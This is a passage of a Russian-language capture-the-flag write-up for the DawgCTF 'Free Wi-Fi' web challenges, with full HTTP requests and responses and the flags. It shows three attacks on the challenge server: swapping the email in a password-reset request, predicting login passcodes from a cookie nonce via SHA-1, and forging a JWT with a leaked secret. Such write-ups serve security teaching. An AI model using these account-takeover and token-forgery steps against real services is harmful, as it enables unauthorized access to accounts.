    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

Мы понимаем, что:
1. страница `/forgotpassword.html` существует;
2. `true.grit@umbccd.io` является пользователем системы;
3. Функциональность восстановления страницы использует 2 разных поля для username и e-mail-а, с программой JavaScript для копирования введенного значения.

Следовательно, можно перехватить запрос и поменять email на тот, который мы контроллируем, оставив username правильным.

```
POST /forgotpassword.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 171
Origin: https://freewifi.ctf.umbccd.io
Connection: close
Referer: https://freewifi.ctf.umbccd.io/forgotpassword.html
Cookie: WifiKey nonce=MjAyMC0wNC0xMCAyMzozNA==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337
Upgrade-Insecure-Requests: 1

user=true.grit%40umbccd.io&csrf_token=ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEDtg.QX6HWsJN_M2Apsv3wUSKn4AIhl4&email=m3ssap0%40yopmail.com&submit=Submit

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Apr 2020 23:40:06 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 2018

<!DOCTYPE html>
<html>
  <head>
    <title>
Forgot your password?
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div align="center" class="col-xs-12">

      <h1>Forgot your password?</h1>

      <div align="left" style="background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;">
        <h3 style="color:blue;">Password recovery</h3>
      	
<form action="" method="post"
  class="form" role="form">
  <input id="user" name="user" type="hidden" value="true.grit@umbccd.io">
<input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpED1g.iElwyWg_AQH1c72HhtcOPZVr02s">
  
    






<div class="form-group  required"><label class="control-label" for="email">Enter your email:</label>
        
          <input class="form-control" id="email" name="email" required type="text" value="m3ssap0@yopmail.com">
        
  </div>


    
    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>
      	<script type="text/javascript">
      	window.onload = function()
      	{
          document.getElementsByClassName('form')[0].onsubmit = function() {
            var email = document.getElementById('email')
            var user = document.getElementById('user')
            user.value = email.value
          }
      	}
        </script>
        <p class="space-above"><strong>DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}</strong></p>
      </div>
    </div>
  </div>
</div>




    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

Флагом является строка:

```
DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}
```

## Free Wi-Fi Part 4

* **Категория:** web/networking
* **Очки:** 250

### Задание

> People seem to have some doohickey that lets them login with a code...
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Решение

Присоединяясь к сайту, устанавливаются 2 интересных куки:

```
Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMCAyMzo1Mg==; Path=/
Set-Cookie: WifiKey alg=SHA1; Path=/
```

Анализируя [PCAP файл](free-wifi.pcap), находим некоторые post запросы, которые отправляют значение `passcode`. Принимая во внимания ранее открытый в куках алгоритм SHA-1 и применяя этот алгоритм к значению WifiKey nonce, понимаем, что значения `passcode` это просто первые 8 символов хешированного значения `nonce`.

```
#85
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMQ==  -> 2020-04-08 17:01
passcode=5004f47a
SHA-1(MjAyMC0wNC0wOCAxNzowMQ==) = 5004f47ae3e2e7c1c9a5ea4d1666f95e6b06b062

#217
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMg==  -> 2020-04-08 17:02
passcode=01c7aeb1
SHA-1(MjAyMC0wNC0wOCAxNzowMg==) = 01c7aeb11b1ee82035e9dc9e0292088d559921b1

#339
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMw==  -> 2020-04-08 17:03
passcode=097b3acf
SHA-1(MjAyMC0wNC0wOCAxNzowMw==) = 097b3acf84e6ed9e66f285cf3750b4ff89da48dc

#655
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzoxMw==  -> 2020-04-08 17:13
passcode=54f03ae2
SHA-1(MjAyMC0wNC0wOCAxNzoxMw==) = 54f03ae2cc8d1415bf06dec1670e03fd4e696982
```

Такой же процесс можно применить к нашему `nonce`.

```
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw== -> 2020-04-11 00:07
SHA-1(MjAyMC0wNC0xMSAwMDowNw==) = ef07d9f7a0f3cce235a644fbb8392f211025aa98
passcode=ef07d9f7
```

И совершить пост запрос.

```
POST /staff.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 134
Origin: https://freewifi.ctf.umbccd.io
Connection: close
Referer: https://freewifi.ctf.umbccd.io/staff.html
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337
Upgrade-Insecure-Requests: 1

csrf_token=ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKKA.bAfOYEeMNYEl-nFUD9XT9rSH0YI&passcode=ef07d9f7&submit=Submit

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 11 Apr 2020 00:07:25 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw==; Path=/
Set-Cookie: WifiKey alg=SHA1; Path=/
Set-Cookie: JWT 'secret'="dawgCTF?heckin#bamboozle"; Path=/
Vary: Cookie
Content-Length: 2594

<!DOCTYPE html>
<html>
  <head>
    <title>
Staff Wifi Login Page
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div align="center" class="col-xs-12">

      <h1>Welcome to the staff login page!</h1>

      <div align="left" style="background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;">

        <h3 style="color:blue;">Staff login</h3>

      	<p>You may use either of the following methods to logon.</p>
	
	<div style="margin:15px;">

      	
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKPQ.xW__Gp06GnXV1BdSSbKG-ZgPtyI">
  
    




<div class="form-group "><label class="control-label" for="username">Username:</label>
        
          <input class="form-control" id="username" name="username" type="text" value="">
        
  </div>


    




<div class="form-group "><label class="control-label" for="password">Password:</label>
        
          <input class="form-control" id="password" name="password" type="password" value="">
        
  </div>


    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>

      	<br/>

      	<p><a href="forgotpassword.html">Forgot your password?</a></p>

      	<h3> OR </h3>

      	
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKPQ.xW__Gp06GnXV1BdSSbKG-ZgPtyI">
  
    






<div class="form-group  required"><label class="control-label" for="passcode">Login with WifiKey:</label>
        
          <input class="form-control" id="passcode" name="passcode" required type="text" value="ef07d9f7">
        
  </div>


    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>

	</div>

      </div>

      	<p class="space-above"><strong>DawgCTF{k3y_b@s3d_l0g1n!}</strong></p>

    </div>
  </div>
</div>



    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

Получим флаг:

```
DawgCTF{k3y_b@s3d_l0g1n!}
```

## Free Wi-Fi Part 2

* **Категория:** web/networking
* **Очки:** 300

### Задание

> I saw someone's screen and it looked like they stayed logged in, somehow...
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Решение

В этом месте заметим несколько интересных куки:
* `JWT 'identity'=31337`;
* `JWT 'secret'="dawgCTF?heckin#bamboozle"`.

Анализируя захват, можно найти 2 пакета #261 и #263, ведущих на JWT-связанную конечную точку.

```
GET /jwtlogin HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMg==; session=eyJjc3JmX3Rva2VuIjoiYTg4ZWQxZjVkODhhZTgyZDEzMWY4ODhmZWExZjYwNDRmNTEwMDgyMCJ9.Xo35dQ.zpNEVjf6uG_5vhqwNCE7bS8QEz0
Connection: keep-alive
Upgrade-Insecure-Requests: 1

HTTP/1.0 401 UNAUTHORIZED
Content-Type: application/json
Content-Length: 125
WWW-Authenticate: JWT realm="Login Required"
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 08 Apr 2020 17:02:35 GMT

{
  "description": "Request does not contain an access token", 
  "error": "Authorization Required", 
  "status_code": 401
}
```

Можно использовать [JWT.io website](https://jwt.io/), чтобы создать валидный JWT токен с identity = `31337` и подписанный секретом `dawgCTF?heckin#bamboozle`.

```
{"alg":"HS256","typ":"JWT"}.{"identity":31337,"iat":1586564945,"nbf":1586564945,"exp":1586908800}.Hx0gLrzRZy4lGdEhvV_eIpdpSSa_pd6FQVBy1pMVNPE

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6MzEzMzcsImlhdCI6MTU4NjU2NDk0NSwibmJmIjoxNTg2NTY0OTQ1LCJleHAiOjE1ODY5MDg4MDB9.Hx0gLrzRZy4lGdEhvV_eIpdpSSa_pd6FQVBy1pMVNPE
```

Вызов конечной точки с токеном JWT в заголовке `Authorization` даст флаг.

```
GET /jwtlogin HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDoxNg==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337; JWT 'secret'="dawgCTF?heckin#bamboozle"
Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6MzEzMzcsImlhdCI6MTU4NjU2NDk0NSwibmJmIjoxNTg2NTY0OTQ1LCJleHAiOjE1ODY5MDg4MDB9.Hx0gLrzRZy4lGdEhvV_eIpdpSSa_pd6FQVBy1pMVNPE
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 11 Apr 2020 00:35:23 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 27

DawgCTF{y0u_d0wn_w!t#_JWT?}
```
